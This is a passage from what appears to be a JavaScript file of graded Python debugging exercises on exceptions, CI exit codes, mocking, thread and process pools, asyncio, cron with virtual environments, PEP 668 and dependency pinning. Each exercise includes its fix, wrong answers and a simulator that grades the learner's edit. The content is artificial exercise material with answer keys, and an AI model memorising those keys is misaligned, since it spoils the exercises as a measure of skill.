import sys

import requests


def healthy(url):
    try:
        return requests.get(url, timeout=5).status_code == 200
    except requests.exceptions.RequestException:
        return False


def deploy(version):
    subprocess.run(["./switch_traffic.sh", version], check=True)
    try:
        if not healthy("http://shop.internal/healthz"):
            print("health check failed, rolling back")
            subprocess.run(["./switch_traffic.sh", "previous"], check=True)
            sys.exit(1)
        print(f"{version} is live")
    except:
        print(f"{version} is live (health check skipped)")


if __name__ == "__main__":
    deploy(sys.argv[1])
`,
      fix: [["    except:\n        print(f\"{version} is live (health check skipped)\")", "    except subprocess.CalledProcessError:\n        print(\"rollback failed\", file=sys.stderr)\n        sys.exit(2)"]],
      wrong: [
        [["    except:\n", "    except BaseException:\n"]],
        [["            sys.exit(1)", "            raise SystemExit(1)"]]
      ],
      hints: [
        "`sys.exit(1)` does not stop the program directly: it raises an exception, SystemExit. Who catches it?",
        "A bare `except:` catches everything, SystemExit and KeyboardInterrupt included; so does `except BaseException`.",
        "Catch only what you mean to handle, for example `except subprocess.CalledProcessError:`, or remove the try. `except Exception` would also let SystemExit through."
      ],
      lesson: "Never use a bare except. sys.exit and Ctrl+C are exceptions too; catch the specific errors you can handle, or at most Exception.",
      real: ["python3 -c \"import sys\ntry:\n    sys.exit(1)\nexcept:\n    print('swallowed')\"; echo \"exit $?\""],
      sim(py) {
        const ex = py.line(/sys\.exit\(\s*1\s*\)|raise\s+SystemExit\(\s*1\s*\)/);
        if (!ex || !py.line(/healthy\(/)) return gone("it no longer stops on a failed health check");
        const before = lines("health check failed, rolling back");
        const h = py.handlers(ex).find((x) => !x.types.length || x.types.some((t) => t === "BaseException" || t === "SystemExit"));
        if (h) {
          const live = /is live/.test(h.body);
          return { out: [...before, ...(live ? lines("2.4.1 is live (health check skipped)") : [])], exit: Number((/sys\.exit\(\s*(\d+)/.exec(h.body) || [])[1] || 0), ok: [false, !live] };
        }
        return { out: before, exit: 1, ok: [true, true] };
      }
    });

    // --- Testing and CI ----------------------------------------------------------------

    S.push({
      id: "exitzero", group: "Testing and CI", level: "11", title: "Exit status 0, so CI passes",
      file: "smoke_test.py", cmd: "python3 smoke_test.py   # the pipeline's smoke-test step",
      story: "A release broke the API. The smoke test printed FAIL for /api/healthz, the pipeline step stayed green, and the release went on to production.",
      goal: "Make the pipeline step fail whenever an endpoint fails.",
      checks: ["The CI step fails when an endpoint fails"],
      code: src`
import sys
import urllib.request

URLS = ["https://shop.example/healthz", "https://shop.example/api/healthz", "https://shop.example/admin/healthz"]


def main():
    failed = []
    for url in URLS:
        try:
            with urllib.request.urlopen(url, timeout=5):
                print("OK  ", url)
        except OSError as e:
            print("FAIL", url, e)
            failed.append(url)
    return 1 if failed else 0


if __name__ == "__main__":
    main()
`,
      fix: [["if __name__ == \"__main__\":\n    main()", "if __name__ == \"__main__\":\n    sys.exit(main())"]],
      wrong: [
        [["if __name__ == \"__main__\":\n    main()", "if __name__ == \"__main__\":\n    print(main())"]],
        [["    return 1 if failed else 0", "    return sys.exit"]]
      ],
      hints: [
        "CI decides pass or fail by the exit status of the process. What status does Python exit with when the script simply ends?",
        "`main()` returns 1, and the value is thrown away. Python exits 0 unless told otherwise.",
        "Pass the result to the interpreter: `sys.exit(main())`."
      ],
      lesson: "The exit status is the contract with cron, CI and shells. Return a code from main() and hand it to sys.exit(); 0 means success, anything else is failure.",
      real: ["python3 smoke_test.py; echo \"exit $?\""],
      sim(py) {
        if (!py.line(/urlopen\(/) || !py.line(/def\s+main\s*\(/)) return gone("it no longer checks the URLs in main()");
        const out = lines("OK   https://shop.example/healthz", "FAIL https://shop.example/api/healthz HTTP Error 503: Service Unavailable", "OK   https://shop.example/admin/healthz");
        const passes = py.has(/^\s*(sys\.exit|raise\s+SystemExit|exit)\(\s*main\(\)\s*\)/m) && py.has(/return\s+1\s+if\s+failed|return\s+(1|len\(failed\)|bool\(failed\))/);
        const printed = py.has(/print\(\s*main\(\)\s*\)/) ? lines("1") : [];
        return { out: [...out, ...printed, dim("---- GitHub Actions"), passes ? err("Error: Process completed with exit code 1.") : dim("Smoke test: succeeded (exit code 0)")], exit: passes ? 1 : 0, ok: [passes] };
      }
    });

    S.push({
      id: "cimock", group: "Testing and CI", level: "11", title: "The test needs production",
      file: "test_monitor.py", cmd: "python3 -m unittest test_monitor   # on the CI runner, which cannot reach shop.internal",
      story: "The unit test passes on every laptop and fails on every CI run. It calls the real shop: from the office it is reachable, from the CI runner it is not.",
      goal: "Test that check() reports UP for a 200 answer, without the network, so the test passes anywhere.",
      checks: ["Passes on a runner with no network", "Really tests the UP case"],
      code: src`
import unittest

import monitor


class CheckTest(unittest.TestCase):
    def test_reports_up_on_200(self):
        self.assertEqual(monitor.check("https://shop.internal/healthz"), "UP")


if __name__ == "__main__":
    unittest.main()
`,
      fix: [["import unittest\n", "import unittest\nfrom unittest import mock\n"],
        ["    def test_reports_up_on_200(self):\n", "    @mock.patch(\"monitor.urllib.request.urlopen\")\n    def test_reports_up_on_200(self, urlopen):\n        urlopen.return_value.__enter__.return_value.status = 200\n"]],
      wrong: [
        [["    def test_reports_up_on_200(self):\n", "    @unittest.skip(\"flaky in CI\")\n    def test_reports_up_on_200(self):\n"]],
        [["\"UP\")", "\"DOWN\")"]]
      ],
      hints: [
        "A unit test should not depend on another machine. Which call in monitor.check() needs the network?",
        "`unittest.mock.patch` replaces a name for the length of one test. Patch it where monitor looks it up: `monitor.urllib.request.urlopen`.",
        "Decorate the test with `@mock.patch(\"monitor.urllib.request.urlopen\")`, take the mock as an argument, and set `urlopen.return_value.__enter__.return_value.status = 200`."
      ],
      lesson: "Unit tests replace the network with mocks, so they are fast and pass anywhere. Skipping a flaky test, or changing what it expects, removes the test instead of fixing it.",
      real: ["python3 -m unittest -v test_monitor"],
      sim(py) {
        if (!py.line(/def\s+test_\w+/) || !py.has(/monitor\.check\(/)) return gone("there is no test of monitor.check() left");
        const skipped = py.has(/@unittest\.skip|self\.skipTest\(/);
        const up = py.has(/assertEqual\([^\n]*["']UP["']|assertTrue\([^\n]*==\s*["']UP["']/);
        const mocked = py.has(/(mock\.)?patch\(\s*["'][\w.]*urlopen["']|patch\.object\([^)]*["']urlopen["']/) && py.has(/status\s*=\s*200|\.status\s*=\s*200|return_value\s*=/);
        const sep = "-".repeat(70);
        if (skipped) return { out: lines("s", sep, "Ran 1 test in 0.000s", "", "OK (skipped=1)"), exit: 0, ok: [true, false] };
        if (mocked && up) return { out: lines(".", sep, "Ran 1 test in 0.002s", "", "OK"), exit: 0, ok: [true, true] };
        if (!up) return { out: lines(".", sep, "Ran 1 test in 5.008s", "", "OK"), exit: 0, ok: [true, false] };
        const n = py.line(/assertEqual\(/);
        return { out: [["F", ""], err("=".repeat(70)), err("FAIL: test_reports_up_on_200 (test_monitor.CheckTest.test_reports_up_on_200)"), err(sep), err("Traceback (most recent call last):"),
          err(`  File "${HOME}/test_monitor.py", line ${n}, in test_reports_up_on_200`), err(`    ${py.src(n)}`), err("AssertionError: 'DOWN' != 'UP'"), err("- DOWN"), err("+ UP"), err(""), err(""), err(sep), err("Ran 1 test in 5.012s"), err(""), err("FAILED (failures=1)")], exit: 1, ok: [false, true] };
      }
    });

    // --- Concurrency -------------------------------------------------------------------

    const FUT = [lib("concurrent/futures/_base.py", 625, "result_iterator", "yield _result_or_cancel(fs.pop())"), lib("concurrent/futures/_base.py", 318, "_result_or_cancel", "return fut.result(timeout)"),
      lib("concurrent/futures/_base.py", 460, "result", "return self.__get_result()"), lib("concurrent/futures/_base.py", 402, "__get_result", "raise self._exception"),
      lib("concurrent/futures/thread.py", 59, "run", "result = self.fn(*self.args, **self.kwargs)")];
    const workers = (py, kind) => {
      const c = py.call(`(concurrent\\.futures\\.)?${kind}`);
      if (!c) return null;
      const w = c.kw.max_workers || c.pos[0];
      return w == null || /^None$/.test(w) ? "default" : Number(w.replace(/_/g, ""));
    };

    S.push({
      id: "pool", group: "Concurrency", level: "09", title: "Too many clients already",
      file: "store_report.py", cmd: "python3 store_report.py   # every 15 minutes, on a 16-CPU host",
      story: "Someone made the store report faster with 200 threads. Each thread opened its own database connection; the database allows 100, the shop already uses 85, and checkout started failing with \"too many clients\".",
      goal: "Use at most 15 connections at a time and still finish within the 15-minute cron interval. Each store's query takes 30 seconds; there are 40 stores.",
      checks: ["Stays within the 15 free connections", "Finishes within 15 minutes"],
      code: src`
from concurrent.futures import ThreadPoolExecutor

import psycopg

DSN = "postgresql://report@db.internal/shop"
STORES = range(1, 41)


def orders_today(store):
    with psycopg.connect(DSN) as conn:
        row = conn.execute("SELECT count(*) FROM orders WHERE store = %s AND day = current_date", (store,)).fetchone()
    return store, row[0]


with ThreadPoolExecutor(max_workers=200) as pool:
    for store, count in pool.map(orders_today, STORES):
        print(f"store {store}: {count} orders")
`,
      fix: [["max_workers=200", "max_workers=10"]],
      wrong: [
        [["max_workers=200", "max_workers=None"]],
        [["max_workers=200", "max_workers=1"]]
      ],
      hints: [
        "Every worker thread holds its own connection while its query runs. How many connections can 200 workers open?",
        "The default, max_workers=None, is min(32, CPUs + 4): 20 on this host, still over 15. One worker takes 40 × 30 s = 20 minutes.",
        "Choose a number between 2 and 15, for example `max_workers=10`: at most 10 connections, and 4 rounds of 30 seconds."
      ],
      lesson: "Concurrency is bounded by the scarcest shared resource, not by your CPU. Size thread pools to what the database, API or disk can take, and leave room for everyone else.",
      real: ["psql -c 'SHOW max_connections' -c 'SELECT count(*) FROM pg_stat_activity'"],
      sim(py) {
        const w = workers(py, "ThreadPoolExecutor");
        if (w == null || !py.has(/orders_today/)) return gone("it no longer runs the store queries in a thread pool");
        const n = w === "default" ? 20 : w;
        if (!(n >= 1)) return { out: traceback(py, "store_report.py", py.line(/ThreadPoolExecutor\(/), [lib("concurrent/futures/thread.py", 144, "__init__", "raise ValueError(\"max_workers must be greater than 0\")")], "ValueError: max_workers must be greater than 0"), exit: 1, ok: [false, false] };
        const minutes = Math.ceil(40 / n) * 0.5;
        const first = lines("store 1: 412 orders", "store 2: 388 orders");
        if (n > 15) {
          const call = py.line(/for\s+\w+.*pool\.map\(/) || py.line(/pool\.map\(/);
          return { out: [...first, ...traceback(py, "store_report.py", call, [...FUT, [`${HOME}/store_report.py`, py.line(/psycopg\.connect\(/), "orders_today", py.src(py.line(/psycopg\.connect\(/))]],
            "psycopg.OperationalError: connection failed: connection to server at \"10.0.3.20\", port 5432 failed: FATAL:  sorry, too many clients already"),
            dim("(frames inside psycopg are left out here)"), dim("---- meanwhile, checkout: FATAL:  sorry, too many clients already")], exit: 1, ok: [false, false] };
        }
        return { out: [...first, dim("(38 more stores)"), dim(`(took ${minutes} minutes; ${n} connection${n === 1 ? "" : "s"} at most)`)], exit: 0, ok: [true, minutes <= 15] };
      }
    });

    S.push({
      id: "gil", group: "Concurrency", level: "09", title: "16 threads, one busy core",
      file: "scan_logs.py", cmd: "python3 scan_logs.py /var/log/nginx/access.log.{1..16}   # 16 files of 2 GB, 16 CPUs",
      story: "Scanning sixteen days of logs takes 41 minutes, with or without the thread pool someone added. top shows python3 at 100% CPU: one core out of sixteen.",
      goal: "Use all the CPUs and finish in under 10 minutes.",
      checks: ["Uses more than one CPU core", "Finishes in under 10 minutes"],
      code: src`
import re
import sys
from concurrent.futures import ThreadPoolExecutor

LINE = re.compile(r'"(?:GET|POST) (\S+) HTTP/[\d.]+" (\d{3})')


def errors_in(path):
    count = 0
    with open(path, encoding="utf-8", errors="replace") as f:
        for line in f:
            m = LINE.search(line)
            if m and m.group(2).startswith("5"):
                count += 1
    return path, count


if __name__ == "__main__":
    with ThreadPoolExecutor(max_workers=16) as pool:
        for path, n in pool.map(errors_in, sys.argv[1:]):
            print(path, n)
`,
      fix: [["from concurrent.futures import ThreadPoolExecutor", "from concurrent.futures import ProcessPoolExecutor"], ["with ThreadPoolExecutor(max_workers=16)", "with ProcessPoolExecutor(max_workers=16)"]],
      wrong: [
        [["max_workers=16", "max_workers=64"]]
      ],
      hints: [
        "The work is pure Python: a regex per line and some string checks. What lets only one thread run Python bytecode at a time?",
        "The GIL. Threads help when they wait on the network or disk; for CPU-bound work you need several processes, each with its own interpreter.",
        "Swap ThreadPoolExecutor for ProcessPoolExecutor (same API). The `if __name__ == \"__main__\":` guard is already there, which processes need."
      ],
      lesson: "In CPython, threads share one GIL: good for waiting on I/O, no faster for CPU-bound Python. Use ProcessPoolExecutor for CPU work, and keep the __main__ guard.",
      real: ["time python3 scan_logs.py access.log.*   # compare top: one core with threads, all cores with processes"],
      sim(py) {
        const proc = workers(py, "ProcessPoolExecutor"), thr = workers(py, "ThreadPoolExecutor");
        if ((proc == null && thr == null) || !py.has(/errors_in/)) return gone("it no longer scans the files in a pool");
        const out = lines("/var/log/nginx/access.log.1 4410", "/var/log/nginx/access.log.2 3982", dim("(14 more files)"));
        if (proc != null) {
          const guarded = py.inside(py.line(/ProcessPoolExecutor\(/), /^if\s+__name__\s*==\s*["']__main__["']/);
          if (!guarded) return { out: [err("RuntimeError:"), err("        An attempt has been made to start a new process before the"), err("        current process has finished its bootstrapping phase.")], exit: 1, ok: [false, false] };
          const cores = proc === "default" ? 16 : Math.min(16, proc);
          const mins = Math.round(41 / cores * 1.1 * 10) / 10;
          return { out: [...out, dim(`(real ${mins} minutes; top shows ${cores} python3 processes at 100% CPU)`)], exit: 0, ok: [cores > 1, mins < 10] };
        }
        return { out: [...out, dim("(real 41 minutes; top shows one python3 at 100% CPU: one core)")], exit: 0, ok: [false, false] };
      }
    });

    S.push({
      id: "futures", group: "Concurrency", level: "09", title: "Lost exceptions in futures",
      file: "restart_fleet.py", cmd: "python3 restart_fleet.py",
      story: "The parallel restart said \"restarted on all hosts\" and exited 0. web-03 had failed: the unit was renamed there last month. The error sat in a Future that nobody looked at.",
      goal: "Report the failure on web-03 and exit non-zero.",
      checks: ["The failure on web-03 is reported", "Exits non-zero"],
      code: src`
import subprocess
from concurrent.futures import ThreadPoolExecutor

HOSTS = ["web-01", "web-02", "web-03", "web-04"]


def restart(host):
    subprocess.run(["ssh", host, "sudo systemctl restart shop"], check=True, timeout=120)


with ThreadPoolExecutor(max_workers=4) as pool:
    for host in HOSTS:
        pool.submit(restart, host)
print("restarted on all hosts")
`,
      fix: [["    for host in HOSTS:\n        pool.submit(restart, host)\n", "    for _ in pool.map(restart, HOSTS):\n        pass\n"]],
      wrong: [
        [["    for host in HOSTS:\n        pool.submit(restart, host)\n", "    pool.map(restart, HOSTS)\n"]],
        [["        pool.submit(restart, host)\n", "        pool.submit(restart, host)\n    pool.shutdown(wait=True)\n"]]
      ],
      hints: [
        "An exception in a worker thread does not stop the program. It is stored in the Future that `submit` returned.",
        "`pool.map` re-raises a worker's exception, but only when you read its results; calling it and ignoring the iterator loses them too.",
        "Read every result: `for _ in pool.map(restart, HOSTS): pass`, or keep the futures and call `.result()` on each (as_completed)."
      ],
      lesson: "Work submitted to an executor fails silently until you collect its result. Always call .result() (or iterate pool.map) so worker exceptions reach the main thread.",
      real: ["python3 -c \"from concurrent.futures import ThreadPoolExecutor as P; P().submit(lambda: 1 / 0); print('no error shown')\""],
      sim(py) {
        if (!py.has(/def\s+restart\(/) || !py.has(/pool\.(submit|map)\(/)) return gone("it no longer restarts the hosts in a pool");
        const remote = err("Failed to restart shop.service: Unit shop.service not found.");
        const doneMsg = py.has(/print\(\s*["']restarted on all/) ? lines("restarted on all hosts") : [];
        const mapIter = py.line(/for\s+[\w, ]+\s+in\s+pool\.map\(|list\(\s*pool\.map\(/);
        const resLine = py.line(/\.result\(\s*\)|\.exception\(\s*\)/);
        const seen = mapIter || (resLine && py.has(/(\w+)\s*=\s*\[?\{?\s*pool\.submit|\.append\(\s*pool\.submit|as_completed\(/));
        if (!seen) return { out: [remote, ...doneMsg], exit: 0, ok: [false, false] };
        const at = mapIter || resLine;
        const h = py.catches(at, ["CalledProcessError", "SubprocessError"]);
        if (h) {
          const code = Number((/sys\.exit\(\s*(\d+)/.exec(py.text.slice(py.text.indexOf(h.body))) || [])[1] || 0);
          return { out: [remote, ...(reports(h.body) ? [err("web-03: restart failed (exit status 5)")] : [])], exit: code, ok: [reports(h.body), code > 0] };
        }
        const frames = mapIter ? FUT : [lib("concurrent/futures/_base.py", 453, "result", "return self.__get_result()"), lib("concurrent/futures/_base.py", 402, "__get_result", "raise self._exception"), FUT[4]];
        const r = py.line(/subprocess\.run\(/);
        return { out: [remote, ...traceback(py, "restart_fleet.py", at, [...frames, [`${HOME}/restart_fleet.py`, r, "restart", py.src(r)], lib("subprocess.py", 578, "run", "raise CalledProcessError(retcode, process.args,\n                         output=stdout, stderr=stderr)")],
          "subprocess.CalledProcessError: Command '['ssh', 'web-03', 'sudo systemctl restart shop']' returned non-zero exit status 5.")], exit: 1, ok: [true, true] };
      }
    });

    S.push({
      id: "asyncblock", group: "Concurrency", level: "09", title: "time.sleep inside async code",
      file: "port_sweep.py", cmd: "time python3 port_sweep.py",
      story: "The SSH port sweep of 200 addresses was rewritten with asyncio to take seconds. It takes over a minute: one polite pause, added after each closed port, freezes everything.",
      goal: "Keep the one-second pause after a closed port without blocking the other checks. The sweep should take about 4 seconds.",
      checks: ["Finishes in about 4 seconds", "The pause really waits (no 'never awaited' warning)"],
      code: src`
import asyncio
import time

HOSTS = [f"10.0.1.{i}" for i in range(1, 201)]


async def check(host):
    try:
        _, writer = await asyncio.wait_for(asyncio.open_connection(host, 22), timeout=3)
        writer.close()
        return host, "open"
    except (OSError, asyncio.TimeoutError):
        time.sleep(1)
        return host, "closed"


async def main():
    results = await asyncio.gather(*(check(h) for h in HOSTS))
    print(sum(1 for _, state in results if state == "open"), "hosts answer on port 22")


asyncio.run(main())
`,
      fix: [["        time.sleep(1)", "        await asyncio.sleep(1)"], ["import asyncio\nimport time\n", "import asyncio\n"]],
      wrong: [
        [["        time.sleep(1)", "        asyncio.sleep(1)"]]
      ],
      hints: [
        "All 200 checks share one thread and one event loop. What happens to the loop while `time.sleep(1)` runs?",
        "`time.sleep` blocks the whole thread; 60 closed ports add 60 seconds, one after another. asyncio has its own sleep, but it is a coroutine.",
        "Use `await asyncio.sleep(1)`. Without `await` the coroutine is created and never run."
      ],
      lesson: "Inside async code, anything that blocks (time.sleep, requests, plain file or socket calls) stalls every task. Await the asyncio version, or move blocking work to asyncio.to_thread.",
      real: ["time python3 port_sweep.py"],
      sim(py) {
        const pause = py.line(/sleep\(/);
        if (!py.has(/asyncio\.gather\(|TaskGroup/) || !py.has(/async\s+def\s+check/)) return gone("it no longer runs the checks concurrently");
        const out = lines("140 hosts answer on port 22");
        if (!pause) return { out: [...out, dim("(real 0m3.1s)")], exit: 0, ok: [true, true] };
        const s = py.code[pause - 1];
        if (/await\s+asyncio\.sleep\(/.test(s)) return { out: [...out, dim("(real 0m4.1s)")], exit: 0, ok: [true, true] };
        if (/asyncio\.sleep\(/.test(s)) return { out: [err(`${HOME}/port_sweep.py:${pause}: RuntimeWarning: coroutine 'sleep' was never awaited`), err(`  ${py.src(pause)}`), err("RuntimeWarning: Enable tracemalloc to get the object allocation traceback"), ...out, dim("(real 0m3.1s)")], exit: 0, ok: [true, false] };
        return { out: [...out, dim("(real 1m3.2s: each time.sleep(1) froze the event loop)")], exit: 0, ok: [false, true] };
      }
    });

    // --- Packaging and environments ------------------------------------------------------

    S.push({
      id: "cronvenv", group: "Packaging and environments", level: "10", title: "Cron uses the wrong Python",
      file: "crontab", lang: "crontab", cmd: "crontab -l   # cron runs each line with /bin/sh, outside your virtual environment",
      story: "The monitor works when you run it by hand, inside its virtual environment. Its cron job has written the same traceback to /var/log/monitor.log every five minutes since it was installed.",
      goal: "Run check.py with the Python from /opt/monitor/.venv, keeping the log redirection.",
      checks: ["The job finds requests (the venv's Python)", "Output still goes to /var/log/monitor.log"],
      code: src`
# m   h  dom mon dow   command
*/5   *  *   *   *     python3 /opt/monitor/check.py >> /var/log/monitor.log 2>&1
`,
      fix: [["python3 /opt/monitor/check.py", "/opt/monitor/.venv/bin/python /opt/monitor/check.py"]],
      wrong: [
        [["python3 /opt/monitor/check.py", "source /opt/monitor/.venv/bin/activate && python3 /opt/monitor/check.py"]],
        [["python3 /opt/monitor/check.py >> /var/log/monitor.log 2>&1", "/opt/monitor/.venv/bin/python /opt/monitor/check.py"]]
      ],
      hints: [
        "A virtual environment is just a directory. \"Activating\" it only changes PATH in your interactive shell; cron never did that.",
        "cron runs commands with /bin/sh, which on Debian and Ubuntu is dash: it has no `source` command.",
        "Call the venv's interpreter directly: `/opt/monitor/.venv/bin/python /opt/monitor/check.py >> /var/log/monitor.log 2>&1`."
      ],
      lesson: "You never need to activate a venv in automation: run its bin/python by full path. It finds its own site-packages from there.",
      real: ["/opt/monitor/.venv/bin/python -c 'import sys; print(sys.prefix)'", "python3 -c 'import sys; print(sys.prefix)'"],
      sim(py) {
        const job = py.code.map((l) => l.trim()).find((l) => /^(\S+\s+){5}\S/.test(l) && !l.startsWith("#"));
        if (!job) return gone("there is no cron line left");
        const cmd = job.split(/\s+/).slice(5).join(" ");
        if (!/check\.py/.test(cmd)) return gone("the cron line no longer runs check.py");
        const logged = />>\s*\/var\/log\/monitor\.log/.test(cmd);
        const venv = /\/opt\/monitor\/\.venv\/bin\/python3?\s+\/opt\/monitor\/check\.py/.test(cmd) || /(^|&&\s*|;\s*)\.\s+\/opt\/monitor\/\.venv\/bin\/activate\s*(&&|;)\s*python3?\s/.test(cmd);
        const where = dim(logged ? "---- /var/log/monitor.log after the next run" : "---- cron mails the output to ops (nothing reaches /var/log/monitor.log)");
        if (/(^|&&\s*|;\s*)source\s/.test(cmd)) return { out: [where, err("/bin/sh: 1: source: not found")], exit: 127, ok: [false, logged] };
        if (venv) return { out: [where, ["2026-10-30 14:05:01 OK https://shop.example/healthz 200 0.21s", ""]], exit: 0, ok: [true, logged] };
        return { out: [where, err("Traceback (most recent call last):"), err('  File "/opt/monitor/check.py", line 4, in <module>'), err("    import requests"), err("ModuleNotFoundError: No module named 'requests'")], exit: 1, ok: [false, logged] };
      }
    });

    const PEP668 = ["error: externally-managed-environment", "", "× This environment is externally managed", "╰─> To install Python packages system-wide, try apt install",
      "    python3-xyz, where xyz is the package you are trying to", "    install.", "    ", "    If you wish to install a non-Debian-packaged Python package,",
      "    create a virtual environment using python3 -m venv path/to/venv.", "    Then use path/to/venv/bin/python and path/to/venv/bin/pip. Make", "    sure you have python3-full installed.", "    ",
      "    If you wish to install a non-Debian packaged Python application,", "    it may be easiest to use pipx install xyz, which will manage a", "    virtual environment for you. Make sure you have pipx installed.", "    ",
      "    See /usr/share/doc/python3.13/README.venv for more information.", "",
      "note: If you believe this is a mistake, please contact your Python installation or OS distribution provider. You can override this, at the risk of breaking your Python installation or OS, by passing --break-system-packages.",
      "hint: See PEP 668 for the detailed specification."].map(err);

    S.push({
      id: "pep668", group: "Packaging and environments", level: "10", title: "externally-managed-environment",
      file: "deploy.sh", lang: "sh", cmd: "sh deploy.sh   # on the new Ubuntu servers",
      story: "The new servers run a current Ubuntu. The deploy script that installed the monitor's packages on the old ones now stops at pip with a long error about an externally managed environment.",
      goal: "Install the requirements into a virtual environment in /opt/monitor/.venv and run check.py with it. Leave the system Python alone.",
      checks: ["Installs the requirements", "Leaves the system Python untouched", "Runs check.py with the venv's Python"],
      code: src`
#!/bin/sh
set -eu
cd /opt/monitor
pip3 install -r requirements.txt
python3 check.py
`,
      fix: [["pip3 install -r requirements.txt\npython3 check.py", "python3 -m venv .venv\n.venv/bin/pip install -r requirements.txt\n.venv/bin/python check.py"]],
      wrong: [
        [["pip3 install -r requirements.txt", "pip3 install --break-system-packages -r requirements.txt"]],
        [["pip3 install -r requirements.txt", "sudo pip3 install -r requirements.txt"]],
        [["pip3 install -r requirements.txt", "pip3 install --user -r requirements.txt"]]
      ],
      hints: [
        "Read the error: the OS manages the system Python's packages with apt, and pip will not install over them (PEP 668).",
        "--break-system-packages does what it says: pip can then replace files apt owns, and a later apt upgrade breaks one or the other. --user and sudo are refused too.",
        "Create a venv and use its tools: `python3 -m venv .venv`, `.venv/bin/pip install -r requirements.txt`, `.venv/bin/python check.py`."
      ],
      lesson: "On current Debian, Ubuntu and Fedora the system Python belongs to the OS. Give every application its own venv (or use pipx for tools) and call that venv's binaries.",
      real: ["python3 -m venv /tmp/demo-venv && /tmp/demo-venv/bin/pip install requests && /tmp/demo-venv/bin/python -c 'import requests; print(requests.__file__)'"],
      sim(py) {
        const steps = py.code.map((l) => l.trim()).filter((l) => l && !l.startsWith("#!"));
        const pip = steps.find((l) => /\bpip3?\b|-m\s+pip\b/.test(l) && /install/.test(l));
        const run = steps.find((l) => /check\.py/.test(l));
        if (!pip || !run) return gone("it no longer installs the requirements and runs check.py");
        const venv = steps.some((l) => /python3?\s+-m\s+venv\s+(\.venv|\/opt\/monitor\/\.venv)/.test(l));
        const venvPip = /(^|\s)(\.venv|\/opt\/monitor\/\.venv)\/bin\/(pip3?|python3?\s+-m\s+pip)\s+install/.test(pip);
        const venvRun = /(\.venv|\/opt\/monitor\/\.venv)\/bin\/python3?\s+check\.py/.test(run);
        const ok = lines("Collecting requests==2.32.3 (from -r requirements.txt (line 1))", dim("(four more packages)"), "Successfully installed certifi-2024.8.30 charset-normalizer-3.4.0 idna-3.10 requests-2.32.3 urllib3-2.2.3");
        const ran = lines("2026-10-30 14:05:01 OK https://shop.example/healthz 200 0.21s");
        if (venv && venvPip) return { out: [...ok, ...(venvRun ? ran : [err("Traceback (most recent call last):"), err('  File "/opt/monitor/check.py", line 4, in <module>'), err("    import requests"), err("ModuleNotFoundError: No module named 'requests'")])], exit: venvRun ? 0 : 1, ok: [true, true, venvRun] };
        if (/--break-system-packages/.test(pip)) return { out: [...ok, ...ran, dim("(pip replaced urllib3, which apt's python3-urllib3 owns; the next apt upgrade overwrites it again, or fails)")], exit: 0, ok: [true, false, false] };
        if (venvPip && !venv) return { out: [err(`sh: 4: ${pip.split(/\s+/)[0]}: not found`)], exit: 127, ok: [false, true, false] };
        return { out: PEP668, exit: 1, ok: [false, true, false] };
      }
    });

    S.push({
      id: "pinning", group: "Packaging and environments", level: "10", title: "An unpinned dependency breaks the deploy",
      file: "requirements.txt", lang: "requirements", cmd: "pip install -r requirements.txt && python check.py   # a fresh deploy, today",
      story: "Nothing in the monitor changed, yet today's deploy fails on start-up. A new major version of urllib3 came out; the code uses an argument it removed. Yesterday's servers still run the old one.",
      goal: "Make every deploy install exactly the versions the code was tested with: requests 2.31.0, urllib3 1.26.20, certifi 2024.8.30, idna 3.10, charset-normalizer 3.4.0.",
      checks: ["Every package, dependencies too, is pinned with ==", "Installs the urllib3 the code was tested with"],
      code: src`
requests
`,
      fix: [["requests\n", "certifi==2024.8.30\ncharset-normalizer==3.4.0\nidna==3.10\nrequests==2.31.0\nurllib3==1.26.20\n"]],
      wrong: [
        [["requests\n", "requests==2.31.0\n"]],
        [["requests\n", "requests>=2.31\nurllib3<2\n"]]
      ],
      hints: [
        "pip installs the newest version of each package that the file allows, including the packages your packages depend on.",
        "Pinning only requests leaves urllib3 free: requests accepts any urllib3 below 3.",
        "Pin everything with ==, the way `pip freeze` prints it from the environment you tested: certifi, charset-normalizer, idna, requests and urllib3."
      ],
      lesson: "Pin direct and transitive dependencies (pip freeze, pip-compile or a lock file) so every deploy is the build you tested. Upgrade on purpose, in a pull request, with tests.",
      real: ["python3 -m venv /tmp/t && /tmp/t/bin/pip install requests==2.31.0 && /tmp/t/bin/pip freeze"],
      sim(py) {
        const reqs = py.code.map((l) => l.trim()).filter((l) => l && !l.startsWith("-"));
        if (!reqs.some((l) => /^requests\b/i.test(l))) return gone("requests is no longer listed");
        const pin = (name) => (reqs.find((l) => new RegExp(`^${name}\\s*==`, "i").test(l)) || "").split("==")[1];
        const all = ["certifi", "charset-normalizer", "idna", "requests", "urllib3"];
        const pinned = all.every((p) => pin(p)) && reqs.every((l) => /==/.test(l));
        const u = pin("urllib3") || (reqs.some((l) => /^urllib3\s*<\s*2/i.test(l)) ? "1.26.20" : "2.8.0");
        const r = pin("requests") || "2.34.2";
        const out = lines(`Successfully installed certifi-${pin("certifi") || "2026.10.5"} charset-normalizer-${pin("charset-normalizer") || "3.4.4"} idna-${pin("idna") || "3.11"} requests-${r} urllib3-${u}`);
        const tested = u.trim() === "1.26.20";
        if (tested) return { out: [...out, dim("---- python check.py"), ...lines("2026-10-30 14:05:01 OK https://shop.example/healthz 200 0.21s")], exit: 0, ok: [pinned, true] };
        return { out: [...out, dim("---- python check.py"), err("Traceback (most recent call last):"), err('  File "/opt/monitor/check.py", line 9, in <module>'), err('    retry = Retry(total=3, backoff_factor=0.5, method_whitelist=["GET"])'),
          err("TypeError: Retry.__init__() got an unexpected keyword argument 'method_whitelist'")], exit: 1, ok: [pinned, false] };
      }
    });

    S.push({
      id: "pkgname", group: "Packaging and environments", level: "10", title: "No matching distribution for yaml",
      file: "requirements.txt", lang: "requirements", cmd: "pip install -r requirements.txt",
      story: "A new script needs `import yaml`, so someone added yaml to requirements.txt. The pipeline now fails at the install step on every branch.",
      goal: "Install the package that provides the yaml module, pinned to 6.0.2.",
      checks: ["pip installs every requirement", "import yaml works"],
      code: src`
requests==2.32.3
yaml==6.0.2
`,
      fix: [["yaml==6.0.2", "PyYAML==6.0.2"]],
      wrong: [
        [["yaml==6.0.2", "yaml"]],
        [["yaml==6.0.2", "python-yaml==6.0.2"]]
      ],
      hints: [
        "The name you import and the name you install are not always the same.",
        "On PyPI the project that provides `import yaml` is PyYAML (likewise `import cv2` is opencv-python, `import bs4` is beautifulsoup4).",
        "Change the line to `PyYAML==6.0.2`."
      ],
      lesson: "Requirements list distribution names from PyPI, which can differ from module names. Check the project's page (or `pip show -f`) before adding a line.",
